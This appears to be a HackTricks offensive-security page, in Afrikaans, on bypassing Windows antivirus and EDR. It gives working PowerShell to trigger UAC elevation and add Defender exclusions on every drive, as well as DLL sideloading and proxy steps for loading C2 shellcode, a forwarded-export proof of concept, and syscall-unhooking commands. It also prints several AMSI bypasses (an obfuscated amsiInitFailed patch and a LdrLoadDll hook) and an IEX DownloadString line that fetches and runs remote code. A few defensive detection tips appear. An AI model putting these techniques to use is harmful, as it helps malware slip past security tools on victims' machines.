# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is oorspronklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Hulpmiddel om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Hulpmiddel om te keer dat Windows Defender werk deur ’n ander AV na te boots.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokmiddel voordat daar met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker om verhoogde regte vra** en Defender daarna onskadelik maak. Die volgorde is eenvoudig:

1. Toets vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die oproeper admin-regte het, dus dui ’n mislukking daarop dat die loader as ’n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsversoek te aktiveer, terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “gekraakte” sagteware installeer, daarom aanvaar hulle gewoonlik die prompt, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle eerder as om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikerprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Sleutelwaarnemings:

- Die lus loop deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), so **enige toekomstige payload wat enige plek op die skyf geplaas word, word geïgnoreer**.
- Die uitsluiting van die `.sys`-uitbreiding is vooruitbeplan—aanvallers hou die opsie oop om later ongetekende drywers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gestoor, sodat latere stadiums kan bevestig dat die uitsluitings behoue bly of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer eenvoudige gesondheidskontroles steeds “antivirus aktief”, al raak intydse inspeksie nooit aan daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV-ontduikingsmetodologie**

AV’s gebruik tans verskillende metodes om te kyk of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese analise en, vir die meer gevorderde EDR’s, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word verkry deur bekende kwaadwillige stringe of grepe-skikkings in ’n binêre lêer of skrip te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat die gebruik van bekende openbare nutsmiddels jou makliker kan laat uitken, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Enkripsie**

As jy die binêre lêer enkripteer, kan AV nie jou program opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in geheue uit te voer.

- **Verduistering**

Soms hoef jy net ’n paar stringe in jou binêre lêer of skrip te verander om dit by AV verby te kry, maar dit kan tydrowend wees, afhangende van wat jy probeer verduister.

- **Pasgemaakte nutsmiddels**

As jy jou eie nutsmiddels ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. Só kan dit jou presies wys watter stringe of grepe in jou binêre lêer gemerk word.

Ek beveel sterk aan dat jy na hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV-ontduiking kyk.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêre lêer in ’n sandbox uitvoer en vir kwaadwillige aktiwiteit dophou (bv. ’n poging om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump op LSASS uit te voer, ens.). Dit kan ’n bietjie lastiger wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Wag voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dinamiese analise te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, so lang pouses kan die analise van binêre lêers ontwrig. Die probleem is dat baie AV-sandboxes die pouse eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne beskikbaar (bv. < 2GB RAM); anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die SVE-temperatuur of selfs die waaierspoed na te gaan; nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die domein wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se sandbox-rekenaarnaam HAL9TH is. Jy kan dus die rekenaarnaam in jou malware nagaan voordat dit ontplof. As die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om sandboxes te omseil

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **openbare nutsmiddels** uiteindelik **opgespoor word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. Neem mimikatz as voorbeeld: dit is waarskynlik een van die mees gemerkte malware-stukke deur AV’s en EDR’s, indien nie die heel mees gemerkte nie. Hoewel die projek self baie gaaf is, is dit ook ’n nagmerrie om mee te werk as jy AV’s wil omseil. Soek dus alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese voorbeeldindiening afskakel** in Defender, en moet asseblief, regtig, **NIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om ontduiking op lang termyn te bereik. As jy wil kyk of ’n spesifieke AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeeldindiening af te skakel en toets dit daar totdat jy tevrede is met die resultaat.

## EXE’s teenoor DLL’s

Wanneer dit moontlik is, **gee altyd voorkeur aan DLL’s vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed, so dit is ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie prent kan sien, het ’n DLL-payload van Havoc ’n opsporingsyfer van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingsyfer van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onsigbaar te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme vind wat vatbaar is vir DLL Sideloading met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-skrip:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys uitvoer van programme in "C:\Program Files\\" wat kwesbaar is vir DLL hijacking, asook die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy self **DLL Hijackable/Sideloadable-programme verken**. Hierdie tegniek is redelik stealthy wanneer dit korrek uitgevoer word, maar as jy publiek bekende DLL Sideloadable-programme gebruik, kan jy maklik opgespoor word.

As jy bloot ’n kwaadwillige DLL met die naam plaas wat ’n program verwag om te laai, sal dit nie jou payload laai nie, aangesien die program spesifieke funksies in daardie DLL verwag. Om hierdie probleem op te los, gebruik ons ’n ander tegniek genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat ’n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL, en behou so die program se funksionaliteit terwyl dit ons payload kan uitvoer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (met [SGN](https://github.com/EgeBalci/sgn) geënkodeer) en die proxy DLL het ’n Detection rate van 0/26 op [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy na [S3cur3Th1sShit se twitch-VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook na [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die uitvoerinskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n oproeper die uitvoer oplos, sal die Windows-loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit oplos

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs-naamruimte voorsien (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL-soekvolgorde gebruik, wat die gids bevat van die module wat die forward resolution uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n ondertekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, geforward word, en plaas dan daardie ondertekende DLL saam met ’n aanvallerbeheerde DLL met presies dieselfde naam as die geforwarde teikenmodule. Wanneer die geforwarde uitvoer aangeroep word, los die loader die forward op en laai jou DLL uit dieselfde gids, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld wat op Windows 11 waargeneem is:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (kopieer-plak):
1) Kopieer die getekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te verkry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die forward met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Wenke vir soektog:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met nutsprogramme soos hierdie lys:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv. rundll32.exe) wat signed DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Stel ’n waarskuwing in vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder gebruiker-skryfbare paadjies
- Dwing code integrity-beleide (WDAC/AppLocker) af en verbied skryf+uitvoer in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op ’n ongemerkte manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net ’n kat-en-muis-speletjie: wat vandag werk, kan môre opgespoor word. Moet dus nooit net op een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie ontduikingstegnieke aan mekaar koppel.

## Direkte/Indirekte Syscalls en SSN-resolusie (SysWhispers4)

EDR’s plaas dikwels **user-mode inline hooks** op `ntdll.dll`-syscall-stubs. Om dié hooks te omseil, kan jy **directe** of **indirecte** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die gehaakte export-entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Aanroepopsies:**
- **Direct (embedded)**: plaas ’n `syscall`-/`sysenter`-/`SVC #0`-instruksie in die gegenereerde stub (geen `ntdll`-export word bereik nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll`, sodat dit lyk asof die kerneroorgang van `ntdll` afkomstig is (nuttig om heuristiese opsporing te ontduik); **randomized indirect** kies per aanroep ’n gadget uit ’n poel.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; los ’n syscall-volgorde tydens looptyd op.

**Hook-bestande SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: koppel ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en ontkoppel dit dan (omseil alle hooks in geheue).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validering wanneer ’n stub skoon is; gebruik VA-afleiding as terugval wanneer dit gehaak is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om gehaakte grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, dus kon die AV niks doen om dit te voorkom as jy op een of ander manier payloads **direk in-geheue** kon uitvoer nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE, COM, MSI of ActiveX-installasie)
- PowerShell (skripte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skripgedrag te inspekteer deur skripinhoud in 'n vorm beskikbaar te stel wat beide ongeënkripteer en nie-verdoesel is.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` byvoeg, gevolg deur die pad na die uitvoerbare lêer waaruit die skrip uitgevoer is; in hierdie geval, powershell.exe

Ons het geen lêer na skyf geskryf nie, maar is steeds in-geheue opgespoor weens AMSI.

Verder word C#-kode, vanaf **.NET 4.8**, ook deur AMSI nagegaan. Dit raak selfs `Assembly.Load(byte[])` vir die laai van in-geheue-uitvoering. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of vroeër) vir in-geheue-uitvoering te gebruik as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van skripte wat jy probeer laai dus 'n goeie manier wees om opsporing te ontduik.

AMSI kan egter skripte ontsyfer, selfs wanneer dit verskeie lae het, dus kan obfuscation 'n swak opsie wees, afhangend van hoe dit gedoen word. Dit maak ontduiking nie heeltemal eenvoudig nie. Soms hoef jy egter net 'n paar veranderlikename te verander en dan is jy reg; dit hang dus af van hoeveel iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as 'n onbevoorregte gebruiker loop. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

As AMSI-inisialisering gedwing word om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n signature ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n aanpassing nodig om hierdie tegniek te gebruik.

Hier is ’n aangepaste AMSI-bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing verskyn, daarom moet jy geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll (wat verantwoordelik is vir die skandering van die gebruiker se invoer) gevind word en dat dit met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Op hierdie manier gee die resultaat van die werklike skandering 0 terug, wat as ’n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir ’n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blokkeer AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. ’n Robuuste, taal-onafhanklike omseiling is om ’n gebruikersmodus-hook op `ntdll!LdrLoadDll` te plaas wat ’n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik word AMSI nooit gelaai nie en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsoorsig (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is al gebruik deur loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` oproep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook scripts om AMSI te omseil.
Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook scripts om AMSI te omseil en handtekeningopsporing te vermy deur ewekansige gebruikergedefinieerde funksies, veranderlikes en karakteruitdrukkings te gebruik, en deur die hooflettergebruik van PowerShell-sleutelwoorde ewekansig te verander.

**Verwyder die bespeurde handtekening**

Jy kan tools soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie tool werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik, vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, en kan jy dus jou scripts laat loop sonder dat AMSI dit skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging is ’n kenmerk waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan log. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil vermy**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell weergawe 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n unmanaged PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit omseil beheermaatreëls wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanselfsprekend AMSI, Script Block Logging of elke ander PowerShell-verdedigingsmeganisme nie; dekking hang af van die runtime en host-implementering.


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die binêre lêer se entropie sal verhoog en dit vir AV’s en EDR’s makliker sal maak om op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke dele van jou kode wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat decompilers en sandboxes sal blokkeer. Die onderstaande werkvloei **herstel betroubaar ’n byna oorspronklike IL** wat daarna met nutsmiddels soos dnSpy of ILSpy na C# gedecompileer kan word.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-tampering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die statiese konstruktor van die *module* (`<Module>.cctor`). Dit verander ook die PE-kontrolesom sodat enige wysiging die binêre lêer sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadata-tabelle op te spoor, die XOR-sleutels te herstel en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool- / beheer-vloei-herwinning – voer die *skoon* lêer aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlagte:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlikename herstel en konstantestrings dekripteer.

3.  Verwydering van proxy calls – ConfuserEx vervang direkte metode-oproepe met liggewig wrappers (ook bekend as *proxy calls*) om dekompilering verder te bemoeilik.  Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

